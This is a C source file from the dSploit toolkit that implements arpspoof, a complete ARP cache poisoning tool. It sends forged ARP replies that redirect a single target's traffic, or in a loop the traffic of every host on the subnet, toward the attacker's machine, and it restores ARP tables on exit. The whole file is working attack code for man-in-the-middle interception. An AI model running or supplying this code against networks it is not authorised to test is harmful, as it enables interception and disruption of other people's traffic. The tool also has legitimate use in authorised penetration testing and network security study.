/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include <netinet/if_ether.h>

#include <droid.h>

#include "arp.h"
#include "version.h"

#define BROADCAST_MAC_ADDR "\xff\xff\xff\xff\xff\xff"

/*Added since Android's ndk couldn't find ether_ntoa*/
char *ether_ntoa(struct ether_addr *addr)
{	//taken from inet/ether_ntoa_r.c
	static char buf[18];
	sprintf (buf, "%x:%x:%x:%x:%x:%x",
        	addr->ether_addr_octet[0], addr->ether_addr_octet[1],
        	addr->ether_addr_octet[2], addr->ether_addr_octet[3],
        	addr->ether_addr_octet[4], addr->ether_addr_octet[5]);
	return buf;
}

static libnet_t *l;
static struct ether_addr spoof_mac, target_mac;
static in_addr_t gateway_ip, target_ip;
static char *iface;

static void
usage(void)
{
	printf( "Version : " VERSION "\n"
			"Usage: arpspoof [-i interface] [-t target] host\n");
	exit(1);
}

static int arp_send( libnet_t *pnet, int arp_op, u_int8_t *sha, in_addr_t spa, u_int8_t *tha, in_addr_t tpa)
{
	int retval;

	if( sha == NULL && ( sha = (u_int8_t *)libnet_get_hwaddr( pnet ) ) == NULL )
	{
		printf( "libnet_get_hwaddr failed : %s\n", libnet_geterror( pnet ) );
		return -1;
	}

	if( spa == 0 && ( spa = libnet_get_ipaddr4( pnet ) ) == -1 )
	{
		printf( "libnet_get_ipaddr4 failed : %s\n", libnet_geterror( pnet ) );
		return -1;
	}

	if( tha == NULL )
		tha = BROADCAST_MAC_ADDR;

	if( libnet_autobuild_arp( arp_op, sha, (u_int8_t *)&spa, tha, (u_int8_t *)&tpa, pnet ) == -1 )
	{
		printf( "libnet_autobuild_arp failed : %s\n", libnet_geterror( pnet ) );
		return -1;
	}

	if( libnet_build_ethernet( tha, sha, ETHERTYPE_ARP, NULL, 0, pnet, 0 ) == -1 )
	{
		printf( "libnet_autobuild_arp failed : %s\n", libnet_geterror( pnet ) );
		return -1;
	}

	retval = libnet_write( pnet );
	if( retval == -1 )
		printf( "libnet_write failed : %s\n", libnet_geterror( pnet ) );

	libnet_clear_packet( pnet );

	return retval;
}

#ifdef __linux__
static int
arp_force(in_addr_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}
#endif

static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{
	int i = 0;

	do {
		if (arp_cache_lookup(ip, mac, iface) == 0)
			return (1);
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip);
#endif
		sleep(1);
	}
	while (i++ < 3);

	return (0);
}

static void
cleanup(int sig)
{
	printf( "Restoring arp table ...\n" );
	int i;
	
	if (arp_find(gateway_ip, &spoof_mac)) {
		for (i = 0; i < 3; i++) {
			/* XXX - on BSD, requires ETHERSPOOF kernel. */
			arp_send(l, ARPOP_REPLY,
				 (u_int8_t *)&spoof_mac, gateway_ip,
				 (target_ip ? (u_int8_t *)&target_mac : NULL),
				 target_ip);
			sleep(1);
		}
	}
	exit(0);
}

int main(int argc, char *argv[])
{
	extern char *optarg;
	extern int   optind;
	char pcap_ebuf[PCAP_ERRBUF_SIZE];
	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
	int  c;
	
	iface			 = NULL;
	gateway_ip = target_ip = 0;
	
	while( (c = getopt(argc, argv, "i:t:h?V")) != -1)
	{
		switch (c)
		{
			case 'i':
				iface = optarg;
				break;
			case 't':
				if ((target_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
					usage();
				break;
			default:
				usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 1)
		usage();
	
	if ((gateway_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
		usage();
	
	if (iface == NULL && (iface = pcap_lookupdev(pcap_ebuf)) == NULL) {
		printf( "%s\n", pcap_ebuf);
		exit(1);
	}

	if ((l = libnet_init(LIBNET_LINK, iface, libnet_ebuf)) == NULL) {
		printf( "%s\n", libnet_ebuf);
		exit(1);
	}
	
	if (target_ip != 0 && !arp_find(target_ip, &target_mac)) {
		printf( "couldn't arp for host %s\n", libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));
		exit(1);
	}
	
	signal( SIGHUP, cleanup );
	signal( SIGINT, cleanup );
	signal( SIGTERM, cleanup );
	
	// single ip spoofing
	if( target_ip != 0 )
	{
		printf( "Single target mode.\n" );
		for (;;) {
			arp_send( l, ARPOP_REPLY, NULL, gateway_ip, (target_ip ? (u_int8_t *)&target_mac : NULL), target_ip );
			sleep(1);
		}
	}
	// whole network spoofing
	else
	{
		printf( "Subnet mode.\n" );

		int netmask = 0,
				ifaddr  = 0,
				nhosts  = 0,
				i;
		pcap_if_t *ifaces = NULL,
						  *pcap_iface;
		pcap_addr_t *pcap_address;

		if( pcap_findalldevs( &ifaces, pcap_ebuf ) != 0 )
		{
			printf( "%s\n", pcap_ebuf);
			exit(1);
		}

		for( pcap_iface = ifaces; pcap_iface != NULL && netmask == 0; pcap_iface = pcap_iface->next )
		{
			if( strcmp( pcap_iface->name, iface ) == 0 )
			{
				for( pcap_address = pcap_iface->addresses; pcap_address != NULL; pcap_address = pcap_address->next )
				{
					if( pcap_address->addr->sa_family == AF_INET )
					{
						ifaddr  = *( unsigned int *)&((struct sockaddr_in*)pcap_address->addr)->sin_addr;
						netmask = *( unsigned int *)&((struct sockaddr_in*)pcap_address->netmask)->sin_addr;

						break;
					}
				}
			}
		}

		if( netmask == 0 || ifaddr == 0 )
			exit( 1 );

		nhosts = ntohl(~netmask);

		printf( "netmask = %s\n", inet_ntoa( *( struct in_addr *)&netmask ) );
		printf( "ifaddr  = %s\n", inet_ntoa( *( struct in_addr *)&ifaddr ) );
		printf( "gateway = %s\n", inet_ntoa( *( struct in_addr *)&gateway_ip ) );
		printf( "hosts   = %d\n", nhosts );

		for(;;)
		{
			for( i = 1; i <= nhosts; i++ )
			{
				int current = ( ifaddr & netmask ) | htonl(i);

				if( current != ifaddr && current != gateway_ip )
					arp_send( l, ARPOP_REPLY, NULL, gateway_ip, NULL, current );
			}

			sleep(1);
		}

	}

	return 0;
}
